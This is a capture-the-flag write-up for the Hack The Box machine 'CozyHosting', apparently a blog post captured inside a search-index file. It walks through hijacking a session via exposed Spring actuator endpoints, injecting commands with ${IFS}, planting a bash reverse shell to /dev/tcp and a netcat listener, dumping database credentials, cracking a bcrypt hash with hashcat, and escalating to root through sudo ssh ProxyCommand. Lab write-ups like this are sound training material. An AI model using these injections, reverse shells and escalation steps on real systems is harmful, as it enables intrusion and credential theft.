href="http://localhost:8080/actuator/sessions">http://localhost:8080/actuator/sessions</a><br><a href="http://localhost:8080/actuator/beans">http://localhost:8080/actuator/beans</a><br><a href="http://localhost:8080/actuator/health">http://localhost:8080/actuator/health</a><br><a href="http://localhost:8080/actuator/health/%7B*path%7D">http://localhost:8080/actuator/health/{*path}</a><br><a href="http://localhost:8080/actuator/env">http://localhost:8080/actuator/env</a><br><a href="http://localhost:8080/actuator/env/%7BtoMatch%7D">http://localhost:8080/actuator/env/{toMatch}</a><br><a href="http://localhost:8080/actuator/mappings">http://localhost:8080/actuator/mappings</a></p><h1 id="Endoint-actuator-sessions"><a href="#Endoint-actuator-sessions" class="headerlink" title="#Endoint &#x2F;actuator&#x2F;sessions"></a>#Endoint &#x2F;actuator&#x2F;sessions</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;DAD1A0B9921669A3828FC1BE56330CBD&quot;:&quot;kanderson&quot;&#125;</span><br></pre></td></tr></table></figure><p>The <code>DAD1A0B9921669A3828FC1BE56330CBD</code> is the cookie for kanderson so we can change our cookie and hijack the session. After we change the cookie we can go to the &#x2F;admin panel (we can find it from the &#x2F;actuator&#x2F;mappings endpoint)</p><p><img src="/images/CozyHosting/Ch(cookie).png" alt="Cookie"></p><h1 id="Admin-Dashboard"><a href="#Admin-Dashboard" class="headerlink" title="#Admin Dashboard"></a>#Admin Dashboard</h1><p><img src="/images/CozyHosting/Ch(Adm_Pan).png" alt="Adm_Panel"></p><p>At the bottom of the page we see a form that require’s a hostname and username for<br>automatic patching. We try to submit hostname as <code>127.0.0.1</code> and username as <code>test</code> but we get an error “Host key verification failed.”</p><p><img src="/images/CozyHosting/Ch(Form).png" alt="Form"></p><p>Probably this means that a service attempts to use ssh to connect to the hostname and username we provide above. As we don’t need to provide any passwords it uses a id_rsa so the command that the service runs is “ssh -i id_rsa username@hostname”</p><p>After some testing I found out that the username does not allow spaces but we can use ${IFS} to bypass that. A simple way to see if the command injection works it to curl a python server that we will host</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure><p>Then we will try to curl our python server and see if we get a callback<br><code>test;curl$&#123;IFS&#125;http://10.10.14.15:8888;</code></p><p><img src="/images/CozyHosting/Ch(Form_Curl).png" alt="Curl Form"><br><img src="/images/CozyHosting/Ch(Callback).png" alt="Call_Back"></p><p>Now we can generate a shell and upload it to the machine</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\nsh -i &gt;&amp; /dev/tcp/10.10.14.15/1234 0&gt;&amp;1&#x27; &gt; rev.sh</span><br></pre></td></tr></table></figure><p>after creating the rev.sh and our python server is running we start out netcat listener</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure><p><img src="/images/CozyHosting/Ch(Form_Shell).png" alt="Curl_Shell"></p><p>And we execute a curl command pointing to the rev.sh we created<br>We got a shell, we can upgrade our shell with running</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/CozyHosting/Ch(Shell_App).png" alt="Shell_APP"></p><h1 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="#Lateral Movement"></a>#Lateral Movement</h1><p>We extract the .jar to tmp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -d /tmp/app cloudhosting-0.0.1.jar</span><br></pre></td></tr></table></figure><p>Inside there after some searching around we can find a application.properties that reveals credentials for a postgresql database.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server.address=127.0.0.1</span><br><span class="line">server.servlet.session.timeout=5m</span><br><span class="line">management.endpoints.web.exposure.include=health,beans,env,sessions,mappings</span><br><span class="line">management.endpoint.sessions.enabled = true</span><br><span class="line">spring.datasource.driver-class-name=org.postgresql.Driver</span><br><span class="line">spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect</span><br><span class="line">spring.jpa.hibernate.ddl-auto=none</span><br><span class="line">spring.jpa.database=POSTGRESQL</span><br><span class="line">spring.datasource.platform=postgres</span><br><span class="line">spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting</span><br><span class="line">spring.datasource.username=postgres</span><br><span class="line">spring.datasource.password=Vg&amp;nvzAQ7XxR</span><br></pre></td></tr></table></figure><p>We can see that a postgresql is running on 5432 and we have creds <code>postgres:Vg&amp;nvzAQ7XxR</code>. Using the command <code>psql -h 127.0.0.1 -U postgres</code> to log in we use <code>\list</code> to list all of the database and we see a <code>cozyhosting</code> that looks interesting so we connect to it</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\connect cozyhosting</span><br></pre></td></tr></table></figure><p>There are 2 tables one with users and one with hosts we use a simple command to dump the users table.</p><p><img src="/images/CozyHosting/Ch(Tables).png" alt="Tables"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p>The admin hash is <code>$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</code></p><h1 id="Cracking-The-hash"><a href="#Cracking-The-hash" class="headerlink" title="#Cracking The hash"></a>#Cracking The hash</h1><p>To identify the hash we use <code>hashid $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</code> or <code>hash-identifier</code> the hash it a bcrypt so after looking for the correct hashcat mode<br>we save the hash into a file and use hashcat with mode <code>3200</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash -m 3200 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/CozyHosting/Ch(Hashcat).png" alt="Hashcat"><br>The hash cracked to <code>manchesterunited</code> and in the home directory we have seen a user <code>josh</code> so we will try to ssh with josh and <code>manchesterunited</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh josh@10.10.11.230</span><br></pre></td></tr></table></figure><p>the flag is on <code>/home/josh/user.txt</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="#Privilege Escalation"></a>#Privilege Escalation</h1><p>We run <code>sudo -l</code> and provided the <code>manchesterunited</code> as password and we see that we can execute the <code>/usr/bin/ssh</code> with sudo.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User josh may run the following commands on localhost:</span><br><span class="line">    (root) /usr/bin/ssh *</span><br><span class="line">with root priv </span><br></pre></td></tr></table></figure><p>After a quick search on gtfo bins <a href="https://gtfobins.github.io/gtfobins/ssh/">https://gtfobins.github.io/gtfobins/ssh/</a> we found that we can run:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure><p>and get a root shell, the flag is on <code>/root/root.txt</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
